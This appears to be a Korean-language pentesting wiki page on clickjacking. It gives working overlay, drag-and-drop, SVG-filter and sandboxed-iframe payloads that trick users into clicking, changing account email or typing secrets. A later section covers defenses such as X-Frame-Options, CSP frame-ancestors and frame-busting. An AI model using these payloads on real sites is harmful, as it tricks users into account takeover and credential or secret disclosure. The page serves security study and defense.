# Clickjacking

{{#include ../banners/hacktricks-training.md}}

## Clickjacking이란

clickjacking 공격에서, **사용자**는 **속임을 당해** **보이지 않거나** 다른 요소로 위장된 웹페이지의 **요소**를 **클릭**하게 됩니다. 이러한 조작은 악성코드 다운로드, 악성 웹페이지로의 리디렉션, 자격증명이나 민감한 정보 제공, 금전 이체 또는 온라인 제품 구매와 같은 사용자에게 의도하지 않은 결과를 초래할 수 있습니다.

### 폼 미리 채우기 트릭

때때로 페이지 로드 시 **GET 파라미터를 사용해 폼 필드의 값을 채우는 것**이 가능할 수 있습니다. 공격자는 이 동작을 악용해 폼을 임의의 데이터로 채우고 clickjacking 페이로드를 전송하여 사용자가 Submit 버튼을 누르게 만들 수 있습니다.

### Drag\&Drop으로 폼 채우기

사용자에게 **폼을 작성**하게 해야 하지만 이메일이나 (당신이 알고 있는) 특정 비밀번호처럼 특정 정보를 직접 입력하라고 요청하고 싶지 않다면, 사용자가 **Drag\&Drop**으로 당신이 제어하는 데이터가 입력되도록 무언가를 드래그하도록 요청할 수 있습니다. 자세한 내용은 [**this example**](https://lutfumertceylan.com.tr/posts/clickjacking-acc-takeover-drag-drop/).

### Basic Payload
```css
<style>
iframe {
position:relative;
width: 500px;
height: 700px;
opacity: 0.1;
z-index: 2;
}
div {
position:absolute;
top:470px;
left:60px;
z-index: 1;
}
</style>
<div>Click me</div>
<iframe src="https://vulnerable.com/email?email=asd@asd.asd"></iframe>
```
### 다단계 Payload
```css
<style>
iframe {
position:relative;
width: 500px;
height: 500px;
opacity: 0.1;
z-index: 2;
}
.firstClick, .secondClick {
position:absolute;
top:330px;
left:60px;
z-index: 1;
}
.secondClick {
left:210px;
}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://vulnerable.net/account"></iframe>
```
### Drag\&Drop + Click payload
```css
<html>
<head>
<style>
#payload{
position: absolute;
top: 20px;
}
iframe{
width: 1000px;
height: 675px;
border: none;
}
.xss{
position: fixed;
background: #F00;
}
</style>
</head>
<body>
<div style="height: 26px;width: 250px;left: 41.5%;top: 340px;" class="xss">.</div>
<div style="height: 26px;width: 50px;left: 32%;top: 327px;background: #F8F;" class="xss">1. Click and press delete button</div>
<div style="height: 30px;width: 50px;left: 60%;bottom: 40px;background: #F5F;" class="xss">3.Click me</div>
<iframe sandbox="allow-modals allow-popups allow-forms allow-same-origin allow-scripts" style="opacity:0.3"src="https://target.com/panel/administration/profile/"></iframe>
<div id="payload" draggable="true" ondragstart="event.dataTransfer.setData('text/plain', 'attacker@gmail.com')"><h3>2.DRAG ME TO THE RED BOX</h3></div>
</body>
</html>
```
### XSS + Clickjacking

만약 **XSS attack that requires a user to click** 를 확인했고 페이지가 **vulnerable to clickjacking** 상태라면, 이를 악용해 사용자가 버튼/링크를 클릭하도록 속일 수 있습니다.\
Example:\
계정의 일부 비공개 정보에서 **self XSS** 를 발견했는데(해당 정보는 **오직 본인만 설정하고 읽을 수 있는** 정보입니다). 이 정보를 설정하는 **form** 페이지는 **vulnerable** to **Clickjacking** 이며 **GET parameters** 로 **form** 을 **prepopulate** 할 수 있습니다.\
공격자는 해당 페이지에 대해 **Clickjacking** 공격을 준비해 **form** 을 **XSS payload** 로 **prepopulating** 하고, **user** 를 **tricking** 하여 **Submit** 하게 만들 수 있습니다. 따라서 **when the form is submitted** 되어 값들이 변경되면, **user will execute the XSS**.


### DoubleClickjacking

Firstly [explained in this post](https://securityaffairs.com/172572/hacking/doubleclickjacking-clickjacking-on-major-websites.html), 이 기법은 victim 에게 특정 위치에 배치한 커스텀 페이지의 버튼을 더블클릭하도록 유도한 뒤, mousedown 과 onclick 이벤트 사이의 타이밍 차이를 이용해 더블클릭 중에 victim 페이지를 불러와 **victim actually clicks a legit button in the victim page** 하게 만듭니다.

An example could be seen in this video: [https://www.youtube.com/watch?v=4rGvRRMrD18](https://www.youtube.com/watch?v=4rGvRRMrD18)

A code example can be found in [this page](https://www.paulosyibelo.com/2024/12/doubleclickjacking-what.html).

> [!WARNING]
> This technique allows to trick the user to click on 1 place in the victim page bypassing every protection against clickjacking. So the attacker needs to find **sensitive actions that can be done with just 1 click, like OAuth prompts accepting permissions**.

### SVG Filters / Cross-Origin Iframe UI Redressing

Modern Chromium/WebKit/Gecko builds let CSS `filter:url(#id)` be applied to cross-origin iframes. The iframe’s rasterized pixels are exposed to the SVG filter graph as `SourceGraphic`, so primitives such as `feDisplacementMap`, `feBlend`, `feComposite`, `feColorMatrix`, `feTile`, `feMorphology`, etc. can arbitrarily warp the victim UI before the user sees it, even though the attacker never touches the DOM. A simple Liquid-Glass style filter looks like:
```html
<iframe src="https://victim.example" style="filter:url(#displacementFilter4)"></iframe>
```
* 유용한 primitives: `feImage` loads attacker bitmaps (e.g., overlays, displacement maps); `feFlood` builds constant-color mattes; `feOffset/feGaussianBlur` refine highlights; `feDisplacementMap` refracts/warps text; `feComposite operator="arithmetic"` implements arbitrary per-channel math (`r = k1*i1*i2 + k2*i1 + k3*i2 + k4`), which is enough for contrast boosting, masking, and AND/OR operations; `feTile` crops and replicates pixel probes; `feMorphology` grows/shrinks strokes; `feColorMatrix` moves luma into alpha to build precise masks.

#### secrets를 CAPTCHA-style 프롬프트로 왜곡하기

만약 framable endpoint가 secrets (tokens, reset codes, API keys)를 렌더링한다면, attacker는 이를 CAPTCHA처럼 보이게 왜곡하여 사용자가 수동으로 입력하도록 강요할 수 있다:
```html
<svg width="0" height="0">
<filter id="captchaFilter">
<feTurbulence type="turbulence" baseFrequency="0.03" numOctaves="4" result="noise" />
<feDisplacementMap in="SourceGraphic" in2="noise" scale="6" xChannelSelector="R" yChannelSelector="G" />
</filter>
</svg>
<iframe src="https://victim" style="filter:url(#captchaFilter)"></iframe>
<input pattern="^6c79 ?7261 ?706f ?6e79$" required>
```
왜곡된 픽셀은 사용자가 공격자가 제어하는 `<input>` 내부의 “solving” captcha를 수행하도록 속이며, 그 `pattern`은 실제 피해자 비밀을 강제합니다.

#### Recontextualizing victim inputs

필터는 사용자 키 입력은 유지하면서 placeholder/validation 텍스트를 외과적으로 삭제할 수 있습니다. 한 가지 워크플로우:

1. `feComposite operator="arithmetic" k2≈4`는 밝기를 증폭시켜 회색 보조 텍스트가 흰색으로 포화되게 합니다.
2. `feTile`은 작업 영역을 입력 사각형으로 제한합니다.
3. `feMorphology operator="erode"`는 피해자가 입력한 어두운 글자 획을 두껍게 하고 `result="thick"`로 저장합니다.
4. `feFlood`는 흰색 판을 만들고, `feBlend mode="difference"`로 `thick`과 결합하며, 두 번째 `feComposite k2≈100`이 이를 강한 휘도 매트로 바꿉니다.
5. `feColorMatrix`는 그 휘도를 알파로 이동시키고, `feComposite in="SourceGraphic" operator="in"`은 사용자 입력 글자만 유지합니다.
6. 또 다른 `feBlend in2="white"`와 얇은 크롭으로 깔끔한 텍스트박스가 만들어지며, 그 후 공격자는 자신의 HTML 레이블(예: “Enter your email”)을 오버레이하지만 숨겨진 iframe은 여전히 피해자 origin의 비밀번호 정책을 강제합니다.

Safari는 `feTile`을 제대로 처리하지 못합니다; 동일한 효과는 WebKit 전용 payload의 경우 `feFlood` + `feColorMatrix` + `feComposite`로 만든 공간 매트(spatial matte)로 재현할 수 있습니다.

#### Pixel probes, logic and state machines

`feTile`로 2–4 px 영역을 크롭하고 이를 뷰포트의 `100%`로 타일링하면, 공격자는 샘플된 색상을 전체 프레임 텍스처로 변환하여 이를 임계값 처리해 불리언 마스크로 만들 수 있습니다:
```html
<filter id="pixelProbe">
<feTile x="313" y="141" width="4" height="4" />
<feTile x="0" y="0" width="100%" height="100%" result="probe" />
<feComposite in="probe" operator="arithmetic" k2="120" k4="-1" />
<feColorMatrix type="matrix" values="0 0 0 0 0  0 0 0 0 0  0 0 0 0 0  0 0 1 0 0" result="mask" />
<feGaussianBlur in="SourceGraphic" stdDeviation="2" />
<feComposite operator="in" in2="mask" />
<feBlend in2="SourceGraphic" />
</filter>
```
임의 색상에 대해, `feFlood` 참조(예: `#0B57D0`)와 `feBlend mode="difference"` 및 또 다른 산술 합성(`k2≈100`, `k4`를 허용 오차로 사용)을 결합하면 샘플된 픽셀이 목표 색상과 일치할 때만 흰색을 출력합니다. 이러한 마스크들을 조정된 `k1..k4`로 `feComposite`에 공급하면 논리 게이트가 만들어집니다: `AND`는 `k1=1`, `OR`는 `k2=k3=1`, `XOR`는 `feBlend mode="difference"`, `NOT`는 흰색과의 블렌딩으로 구현됩니다. 게이트를 연결하면 필터 그래프 내부에 full adder가 구성되어 파이프라인이 기능적으로 완전함을 증명합니다.

따라서 공격자는 JavaScript 없이도 UI 상태를 읽을 수 있습니다. 모달 워크플로우에서의 예시 불리언들:

- **D** (dialog visible): 어두워진 모서리를 검사하여 흰색과 비교합니다.
- **L** (dialog loaded): 버튼이 준비되면 나타나는 좌표를 검사합니다.
- **C** (checkbox checked): 체크박스 픽셀을 활성 파랑 `#0B57D0`와 비교합니다.
- **R** (red success/failure banner): 배너 영역 내부에서 `feMorphology`와 빨강 임계값을 사용합니다.

각 감지된 상태는 `feImage xlink:href="data:..."`로 임베드된 서로 다른 오버레이 비트맵에 게이트를 걸어줍니다. 이러한 비트맵을 `D`, `L`, `C`, `R`로 마스킹하면 오버레이가 실제 대화상자와 동기화되어 DOM을 전혀 노출하지 않고도 피해자를 다단계 워크플로(비밀번호 재설정, 승인, 파괴적 확인 등)로 안내할 수 있습니다.

### 샌드박스된 iframe Basic Auth 대화상자 (no allow-popups)

`allow-popups`가 없는 샌드박스된 iframe은 로드가 `401`과 함께 `WWW-Authenticate`를 반환할 때 브라우저가 제어하는 **HTTP Basic Authentication modal**을 여전히 표시할 수 있습니다. 이 대화상자는 브라우저의 네트워킹/인증 계층에서 생성되며(JS의 `alert/prompt/confirm`이 아님), 따라서 샌드박스의 팝업 제한은 이를 억제하지 않습니다. iframe을 스크립트로 제어할 수 있다면(예: `sandbox="allow-scripts"`) Basic Auth 챌린지를 발생시키는 어떤 엔드포인트로도 이동시킬 수 있습니다:
```html
<iframe id="basic" sandbox="allow-scripts"></iframe>
<script>
basic.src = "https://httpbin.org/basic-auth/user/pass"
</script>
```
응답이 도착하면 브라우저는 팝업이 금지되어 있어도 자격 증명을 요청하는 프롬프트를 표시할 수 있다. 이 트릭으로 신뢰할 수 있는 출처를 프레이밍하면 UI 재배치/피싱이 가능해진다: "샌드박스화된" 위젯 내부의 예기치 않은 모달 프롬프트는 사용자를 혼동시키거나 비밀번호 관리자가 저장된 자격 증명을 제공하도록 유도할 수 있다.

### 브라우저 확장 기능: DOM-based autofill clickjacking

피해자 페이지를 iframe으로 불러오는 것 외에도, 공격자는 페이지에 주입되는 브라우저 확장 프로그램의 UI 요소를 노릴 수 있다. 비밀번호 관리자는 포커스된 입력 필드 근처에 autofill 드롭다운을 렌더링한다; 공격자가 제어하는 필드에 포커스를 주고 확장 기능의 드롭다운을 숨기거나 가리치면(opacity/overlay/top-layer 트릭), 강제된 사용자 클릭으로 저장된 항목이 선택되어 민감한 데이터가 공격자 제어 입력 필드에 채워질 수 있다. 이 변형은 iframe 노출이 전혀 필요 없으며 전적으로 DOM/CSS 조작으로 동작한다.

- For concrete techniques and PoCs see:
{{#ref}}
browser-extension-pentesting-methodology/browext-clickjacking.md
{{#endref}}

## Clickjacking 완화 전략

### 클라이언트 측 방어

클라이언트 측에서 실행되는 스크립트는 Clickjacking을 방지하기 위한 동작을 수행할 수 있다:

- 애플리케이션 창이 메인 또는 최상위 창인지 확인.
- 모든 프레임을 가시화.
- 보이지 않는 프레임에 대한 클릭 차단.
- 잠재적 Clickjacking 시도를 탐지하고 사용자에게 경고.

하지만 이러한 frame-busting 스크립트는 우회될 수 있다:

- **Browsers' Security Settings:** 일부 브라우저는 보안 설정이나 JavaScript 미지원으로 인해 이러한 스크립트를 차단할 수 있다.
- **HTML5 iframe `sandbox` Attribute:** 공격자는 `sandbox` 속성에 `allow-forms` 또는 `allow-scripts` 값을 지정하고 `allow-top-navigation`을 포함하지 않음으로써 frame buster 스크립트를 무력화할 수 있다. 이렇게 하면 iframe이 최상위 창인지 확인하지 못하게 된다, 예:
```html
<iframe
id="victim_website"
src="https://victim-website.com"
sandbox="allow-forms allow-scripts"></iframe>
```
The `allow-forms` and `allow-scripts` values enable actions within the iframe while disabling top-level navigation. To ensure the intended functionality of the targeted site, additional permissions like `allow-same-origin` and `allow-modals` might be necessary, depending on the attack type. Browser console messages can guide which permissions to allow.

### 서버 측 방어

#### X-Frame-Options

The **`X-Frame-Options` HTTP response header** informs browsers about the legitimacy of rendering a page in a `<frame>` or `<iframe>`, helping to prevent Clickjacking:

- `X-Frame-Options: deny` - No domain can frame the content.
- `X-Frame-Options: sameorigin` - Only the current site can frame the content.
- `X-Frame-Options: allow-from https://trusted.com` - Only the specified 'uri' can frame the page.
- Note the limitations: if the browser doesn't support this directive, it might not work. Some browsers prefer the CSP frame-ancestors directive.

#### Content Security Policy (CSP) frame-ancestors 지시어

**`frame-ancestors` directive in CSP** is the advised method for Clickjacking protection:

- `frame-ancestors 'none'` - Similar to `X-Frame-Options: deny`.
- `frame-ancestors 'self'` - Similar to `X-Frame-Options: sameorigin`.
- `frame-ancestors trusted.com` - Similar to `X-Frame-Options: allow-from`.

For instance, the following CSP only allows framing from the same domain:

`Content-Security-Policy: frame-ancestors 'self';`

Further details and complex examples can be found in the [frame-ancestors CSP documentation](https://w3c.github.io/webappsec-csp/document/#directive-frame-ancestors) and [Mozilla's CSP frame-ancestors documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors).

### Content Security Policy (CSP)와 `child-src` 및 `frame-src`

**Content Security Policy (CSP)**는 브라우저가 어떤 출처에서 콘텐츠를 로드하도록 허용할지 지정함으로써 Clickjacking 및 기타 코드 인젝션 공격을 방지하는 보안 수단입니다.

#### `frame-src` Directive

- Defines valid sources for frames.
- More specific than the `default-src` directive.
```
Content-Security-Policy: frame-src 'self' https://trusted-website.com;
```
이 정책은 동일 출처(self)와 https://trusted-website.com의 프레임을 허용합니다.

#### `child-src` 디렉티브

- 웹 워커와 프레임에 대한 유효한 출처를 설정하기 위해 CSP 레벨 2에서 도입되었습니다.
- frame-src 및 worker-src의 대체(폴백) 역할을 합니다.
```
Content-Security-Policy: child-src 'self' https://trusted-website.com;
```
이 정책은 동일 출처(self)와 https://trusted-website.com으로부터의 frames 및 workers를 허용합니다.

**Usage Notes:**

- Deprecation: child-src is being phased out in favor of frame-src and worker-src.
- Fallback Behavior: If frame-src is absent, child-src is used as a fallback for frames. If both are absent, default-src is used.
- Strict Source Definition: Include only trusted sources in the directives to prevent exploitation.

#### JavaScript Frame-Breaking Scripts

완전히 완벽한 방법은 아니지만, JavaScript 기반의 frame-busting scripts를 사용하여 웹 페이지가 프레임에 포함되는 것을 방지할 수 있습니다. 예:
```javascript
if (top !== self) {
top.location = self.location
}
```
#### Anti-CSRF Tokens 적용

- **토큰 검증:** 웹 애플리케이션에서 anti-CSRF tokens를 사용해 상태 변경 요청이 사용자의 의도에 따른 것이며 Clickjacked 페이지를 통해 발생하지 않도록 하세요.

## 참고자료

- [**https://portswigger.net/web-security/clickjacking**](https://portswigger.net/web-security/clickjacking)
- [**https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html**](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html)
- [DOM-based Extension Clickjacking (marektoth.com)](https://marektoth.com/blog/dom-based-extension-clickjacking/)
- [SVG Filters - Clickjacking 2.0](https://lyra.horse/blog/2025/12/svg-clickjacking/)
- [Iframe sandbox Basic Auth modal](https://phor3nsic.github.io/2026/01/21/trick-iframe-sandbox.html)
- [Chromestatus: Restrict sandboxed frame dialogs](https://chromestatus.com/feature/4747009953103872)
- [Chromium issue about sandboxed auth dialogs](https://issues.chromium.org/issues/40266321)

{{#include ../banners/hacktricks-training.md}}
